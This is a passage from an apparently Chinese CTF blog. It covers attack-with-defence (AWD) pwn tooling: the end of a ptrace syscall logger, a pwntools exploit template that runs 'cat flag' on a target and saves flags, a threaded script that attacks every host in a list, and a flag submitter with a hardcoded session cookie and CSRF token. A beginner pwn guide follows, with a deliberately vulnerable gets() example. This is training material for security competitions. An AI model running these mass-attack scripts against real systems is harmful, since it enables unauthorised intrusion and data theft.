status;</span><br><span class="line">	<span class="keyword">int</span> insyscall = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> first_time = <span class="number">1</span>;</span><br><span class="line">	pid = fork();</span><br><span class="line">	<span class="keyword">int</span> sys_num;</span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">SYSTYPE</span> <span class="title">sys_status</span>;</span></span><br><span class="line">	<span class="comment">// we use child process to exec </span></span><br><span class="line">	<span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">		ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">		argv[<span class="number">1</span>] = FILENAME;</span><br><span class="line">		status = execvp(FILENAME, argv+<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">if</span>(status&lt;<span class="number">0</span>)&#123;</span><br><span class="line">			perror(<span class="string">&quot;ERROR EXEC\n&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// parent to get child syscall</span></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>)&#123;</span><br><span class="line">		write_new_attack();</span><br><span class="line">		<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">			wait(&amp;status);</span><br><span class="line">			<span class="keyword">if</span>(WIFEXITED(status))</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="comment">// get rax to ensure witch syscall</span></span><br><span class="line">			ptrace(PTRACE_GETREGS, pid, <span class="literal">NULL</span>, &amp;regs);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> MACHINE == 64</span></span><br><span class="line">			sys_num = regs.orig_rax;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> MACHINE == 32</span></span><br><span class="line">			sys_num = regs.orig_eax;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">			<span class="keyword">if</span> (sys_num != SYS_read &amp;&amp; sys_num != SYS_write)&#123;</span><br><span class="line">				ptrace(PTRACE_SYSCALL, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (insyscall==<span class="number">0</span>)&#123;</span><br><span class="line">				insyscall = <span class="number">1</span>;</span><br><span class="line">				ptrace(PTRACE_SYSCALL, pid, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="comment">// we should ignor the first time</span></span><br><span class="line">				<span class="comment">// checl it is standard pipe or not</span></span><br><span class="line">				<span class="keyword">int</span> is_standard = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> MACHINE == 64</span></span><br><span class="line">				is_standard = check_standard(regs.rdi);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> MACHINE == 32</span></span><br><span class="line">				is_standard = check_standard(regs.ebx);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> </span></span><br><span class="line">				<span class="keyword">if</span>(!is_standard)&#123;</span><br><span class="line">					first_time = <span class="number">0</span>;</span><br><span class="line">					ptrace(PTRACE_SYSCALL, pid, <span class="literal">NULL</span> ,<span class="literal">NULL</span>);</span><br><span class="line">					insyscall ^= <span class="number">1</span>;</span><br><span class="line">					<span class="keyword">continue</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span>(sys_num == SYS_read)</span><br><span class="line">					sys_status = READ;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (sys_num == SYS_write)</span><br><span class="line">					sys_status = WRITE;</span><br><span class="line">				<span class="keyword">int</span> size = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">char</span>* addr = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> MACHINE == 64</span></span><br><span class="line">				size = regs.rdx;</span><br><span class="line">				<span class="comment">// size = (size + sizeof(long)-1)/sizeof(long) * sizeof(long) +1;</span></span><br><span class="line">				addr = (<span class="keyword">char</span>*)regs.rsi;</span><br><span class="line">				<span class="comment">// printf(&quot; the addr is %lx with size %lx&quot;, addr, size);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> MACHINE == 32</span></span><br><span class="line">				size = regs.edx;</span><br><span class="line">				addr = (<span class="keyword">char</span>*)regs.ecx;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> </span></span><br><span class="line">				write_log(pid, addr, size, sys_status);</span><br><span class="line">				insyscall = <span class="number">0</span>;</span><br><span class="line">				ptrace(PTRACE_SYSCALL, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		perror(<span class="string">&quot;ERROR FORK!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="AWD-EXP"><a href="#AWD-EXP" class="headerlink" title="AWD EXP"></a>AWD EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># author: i0gan</span></span><br><span class="line"><span class="comment"># a script for awd exp</span></span><br><span class="line"><span class="comment"># env: pwndocker [skysider/pwndocker (v: 2020/09/09)]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf_path  = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">arch = <span class="string">&#x27;64&#x27;</span></span><br><span class="line">libc_v = <span class="string">&#x27;2.27&#x27;</span></span><br><span class="line">MODIFY_LD = <span class="number">0</span></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIBC  = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(sys.argv) &lt; <span class="number">3</span>):</span><br><span class="line">	LOCAL = <span class="number">1</span></span><br><span class="line">	context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	server_ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">	server_port = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>], <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">ld_path   = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/ld-linux-x86-64.so.2&#x27;</span></span><br><span class="line">libs_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># change ld path </span></span><br><span class="line"><span class="keyword">if</span>(MODIFY_LD):</span><br><span class="line">	change_ld_cmd = <span class="string">&#x27;patchelf  --set-interpreter &#x27;</span> + ld_path +<span class="string">&#x27; &#x27;</span> + elf_path</span><br><span class="line">	os.system(change_ld_cmd)</span><br><span class="line">	li(<span class="string">&#x27;modify ld ok!&#x27;</span>)</span><br><span class="line">	exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">	<span class="keyword">if</span>(LOCAL):</span><br><span class="line">		gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cat_flag</span>(<span class="params">io</span>):</span></span><br><span class="line">	sleep(<span class="number">1</span>)</span><br><span class="line">	sl(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">	flag = <span class="string">b&#x27;flag&#123;&#x27;</span>  + ru(<span class="string">&#x27;&#125;&#x27;</span>) + <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">	wd  = flag</span><br><span class="line">	wd += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">	fd = <span class="built_in">open</span>(<span class="string">&#x27;./flags&#x27;</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">	fd.write(wd.decode())</span><br><span class="line">	fd.close()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	li(<span class="string">&#x27;exploit...&#x27;</span>)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path, <span class="string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path&#125; )</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		io = remote(server_ip, server_port)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>该脚本攻打成功后, 会在./flags文件中追加获得的flag</p>
<h2 id="AWD-实现批量攻击"><a href="#AWD-实现批量攻击" class="headerlink" title="AWD 实现批量攻击"></a>AWD 实现批量攻击</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># author: i0gan </span></span><br><span class="line"><span class="comment"># script for awd mode</span></span><br><span class="line"><span class="comment"># env: pwndocker [skysider/pwndocker (v: 2020/09/09)]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> sys,os</span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : print(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exploit</span>(<span class="params">threading.Thread</span>):</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,ips, ports</span>):</span></span><br><span class="line">		threading.Thread.__init__(self)</span><br><span class="line">		self.ips_ = ips</span><br><span class="line">		self.ports_ = ports</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">		<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">			<span class="keyword">if</span> self.ips_.empty():</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				<span class="comment"># scrpt for it</span></span><br><span class="line">				ip   = self.ips_.get(timeout=<span class="number">0.5</span>)</span><br><span class="line">				port = self.ports_.get(timeout=<span class="number">0.5</span>)</span><br><span class="line">				os.system(<span class="string">&#x27;python3 ./exp.py&#x27;</span>) <span class="comment"># run exp</span></span><br><span class="line">				li(<span class="string">&#x27;ip: &#x27;</span> + ip + <span class="string">&#x27; : &#x27;</span> + <span class="built_in">str</span>(port))</span><br><span class="line">			<span class="keyword">except</span>:</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>():</span></span><br><span class="line">	li(<span class="string">&#x27;start loop attack...&#x27;</span>)</span><br><span class="line">	thread_count = <span class="number">8</span>  <span class="comment"># thread number</span></span><br><span class="line">	threads = []</span><br><span class="line">	ips = queue.Queue()</span><br><span class="line">	ports = queue.Queue()</span><br><span class="line">	f = <span class="built_in">open</span>(<span class="string">&quot;./hosts&quot;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="comment"># read ip and port from hosts file</span></span><br><span class="line">	lines = f.readlines()</span><br><span class="line">	f.close()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">		get_line = line.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">		info = get_line.split(<span class="string">&#x27;:&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">		<span class="comment">#print(info)</span></span><br><span class="line">		ips.put(info[<span class="number">0</span>])</span><br><span class="line">		ports.put(<span class="built_in">int</span>(info[<span class="number">1</span>], <span class="number">10</span>))</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(thread_count):</span><br><span class="line">		threads.append(Exploit(ips, ports))</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">		t.start()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">		t.join()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	attack()</span><br></pre></td></tr></table></figure>

<p>该脚本从./hosts文件中读取ip 和port, 同时攻打</p>
<h2 id="AWD-实现批量提交flag"><a href="#AWD-实现批量提交flag" class="headerlink" title="AWD 实现批量提交flag"></a>AWD 实现批量提交flag</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># auto submit flag script for fack awd</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : print(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">csrf_token = <span class="string">&#x27;a9e17a178bfcdf29291c495fd0e3175a138c8ae6555cba89c7c9d0a56dd23293&#x27;</span></span><br><span class="line">cookie = <span class="string">&#x27;session=5dd2b2c8-261f-4337-bce2-3885ab7de331&#x27;</span></span><br><span class="line">ip = <span class="string">&#x27;http://ltalk.co:1024&#x27;</span></span><br><span class="line">submit_dir = <span class="string">&#x27;/api/v1/challenges/attempt&#x27;</span></span><br><span class="line">url = ip + submit_dir</span><br><span class="line">flag_file = <span class="string">&#x27;./flags&#x27;</span></span><br><span class="line">sleep_time = <span class="number">120</span></span><br><span class="line">challenge_id = <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span>():</span></span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(flag_file) <span class="keyword">as</span> flag_txt:</span><br><span class="line">		flags = flag_txt.readlines()</span><br><span class="line">		<span class="keyword">for</span> flag <span class="keyword">in</span> flags:</span><br><span class="line">			flag = flag.strip()</span><br><span class="line">			dic = &#123;<span class="string">&#x27;challenge_id&#x27;</span>: challenge_id,<span class="string">&#x27;submission&#x27;</span>:flag&#125;</span><br><span class="line">			json_flag = json.dumps(dic)</span><br><span class="line">			print(json_flag)</span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				header = &#123;<span class="string">&#x27;Cookie&#x27;</span>:cookie,<span class="string">&#x27;CSRF-Token&#x27;</span>:csrf_token,<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/json&#x27;</span>&#125;</span><br><span class="line">				res = requests.post(url,data=json_flag,headers=header,timeout=<span class="number">1</span>)</span><br><span class="line">				li(res.text)</span><br><span class="line">			<span class="keyword">except</span>:</span><br><span class="line">				li(<span class="string">&#x27;connect fail!&#x27;</span>)</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	submit()</span><br><span class="line">	time.sleep(sleep_time)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>该脚本从./flags文件中读取flag, 依次提交至平台</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/09/13/awd-pwn-attack-script/" data-id="ckhemv7zn0007wdcmf7ps8muf" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/awd/" rel="tag">awd</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-pwn-for-beginner" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/12/pwn-for-beginner/" class="article-date">
  <time datetime="2020-09-12T14:00:05.000Z" itemprop="datePublished">2020-09-12</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/12/pwn-for-beginner/">pwn for beginner</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="二进制pwn方向入门"><a href="#二进制pwn方向入门" class="headerlink" title="二进制pwn方向入门"></a>二进制pwn方向入门</h1><h3 id="0x0-What-is-the-pwn"><a href="#0x0-What-is-the-pwn" class="headerlink" title="0x0 What is the pwn?"></a>0x0 What is the pwn?</h3><p>​    pwn是一个黑客语法的俚语词 ，是指攻破设备或者系统。发音类似“砰”，对黑客而言，这就是成功实施黑客攻击的声音——砰的一声，被“黑”的电脑或手机就被你操纵了 (百度百科)</p>
<p>​    ctf比赛,想必你已经了解过了,基本方向就分为 web, pwn, reverse, misc, crypto,  android, blockchain， 但主要方向为两个web安全和二进制安全, 那么pwn呢就属于二进制安全的一个分支, pwn的话入门确实相比其他方向的难度要高一点, 基本上ctf的各大比赛pwn与web都占主导位置, ctf的awd模式只有web和pwn, 所以pwn在ctf领域, 是个很不错的选择方向。pwn是二进制漏洞挖掘与利用, 那么在实际中,  各大服务器软件中经常曝出缓冲区溢出漏洞, 有时候ctf比赛中还会直接拿最近曝的cve来出题。pwn的漏洞利用技巧与实际中的二进制安全密不可分。那么该怎么入门pwn呢, 接下来我来为你即将入门的pwn手详细讲解。</p>
<h2 id="0x1-pwn入门学习准备"><a href="#0x1-pwn入门学习准备" class="headerlink" title="0x1 pwn入门学习准备"></a>0x1 pwn入门学习准备</h2><h4 id="linux学习"><a href="#linux学习" class="headerlink" title="linux学习"></a>linux学习</h4><p>​    先学会使用虚拟机装一下linux系统, 推荐先试试装一下 ubuntu16</p>
<p>​    了解linux的程序装载和执行</p>
<p>​    了解linux的elf格式</p>
<p>​    了解一下程序的堆栈结构</p>
<h4 id="c-c-语言学习"><a href="#c-c-语言学习" class="headerlink" title="c / c++语言学习"></a>c / c++语言学习</h4><p>​     基本语法的与简单正向编写</p>
<h4 id="python语言学习"><a href="#python语言学习" class="headerlink" title="python语言学习"></a>python语言学习</h4><p>​    基本语法就行, 为以后写exp</p>
<h4 id="汇编语言学习"><a href="#汇编语言学习" class="headerlink" title="汇编语言学习"></a>汇编语言学习</h4><p>​    学一下简单的x86_64汇编指令, 读懂一些简单的就行</p>
<h4 id="简单逆向"><a href="#简单逆向" class="headerlink" title="简单逆向"></a>简单逆向</h4><p>​    熟悉使用ida软件逆一下简单的程序, 可以先逆一下linux的elf程序</p>
<h2 id="0x2-工具篇"><a href="#0x2-工具篇" class="headerlink" title="0x2 工具篇"></a>0x2 工具篇</h2><p>工欲善其事,必先利其器。以下工具是pwn需要用的.</p>
<p>ida : 反汇编绝佳利器, 以后想为程序打patch, 也可以使用它</p>
<p>pwntools: 用于在python下写pwn利用脚本的库</p>
<p>pwndbg: 基于python与gdb更直观的调试工具, 方便调试程序</p>
<p>ROPgadget: 查找偏移的利器</p>
<p>以上是pwn必备的工具.</p>
<p>下面是入门后的工具:</p>
<p>one_gadget: 获取libc的one gadget, 入门之后再了解</p>
<p>seccomp: 沙箱检测工具, 入门之后再了解</p>
<p>pwn docker: 已经搭建好的pwn docker镜像, 不用手动搭建pwn环境, 入门之后再换环境吧</p>
<h2 id="0x3-经典常见技巧学习"><a href="#0x3-经典常见技巧学习" class="headerlink" title="0x3 经典常见技巧学习"></a>0x3 经典常见技巧学习</h2><h4 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h4><p>​    basic stack overflow</p>
<p>​    leak cannary</p>
<p>​    ret2text</p>
<p>​    ret2shellcode</p>
<p>​    ret2syscall</p>
<p>​    ret2libc</p>
<p>​    rop</p>
<p>​    row</p>
<p>​    ret2dl-resolve</p>
<p>…</p>
<h4 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h4><p>​    leak (libc , stack, elf)</p>
<p>​    leak anything anywhere</p>
<p>​    modify anything anywhere</p>
<p>​    use it no stack</p>
<p>…</p>
<h4 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h4><p>basic heap overflow</p>
<p>fastbin attack</p>
<p>unlink</p>
<p>house of einherjar</p>
<p>off by one</p>
<p>off by null</p>
<p>unsorted bin attack</p>
<p>uaf (libc.so.2.27 and libc.so.2.23)</p>
<p>house of roman</p>
<p>house of orange</p>
<p>house of *…</p>
<p>…</p>
<h3 id="ohters"><a href="#ohters" class="headerlink" title="ohters"></a>ohters</h3><p>python sandbox escape</p>
<p>iofile attack</p>
<p>hijack hook (malloc_hook, realloc_hook, free_hook….)</p>
<p>hijack elf got table</p>
<p>hijack ld got table</p>
<p>leak libc by print got</p>
<p>leak libc by modify IO_2_1_stdout struct</p>
<p>….</p>
<h2 id="0x4-入门实例"><a href="#0x4-入门实例" class="headerlink" title="0x4 入门实例"></a>0x4 入门实例</h2><p>这里默认你已经学会了基本的入门准备, pwn环境搭建我也不必多说了吧,百度或者google一下,看别人是怎么搭建pwn环境的。 那一下内容为最简单的stack overflow, 先了解一下stack overflow的劫持实验。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">void vul() &#123;</span><br><span class="line">	char arr[16];</span><br><span class="line">	gets(arr);</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">	vul();</span><br><span class="line">	printf(&quot;no error\n&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>保存为a.c 尝试编译一下</p>
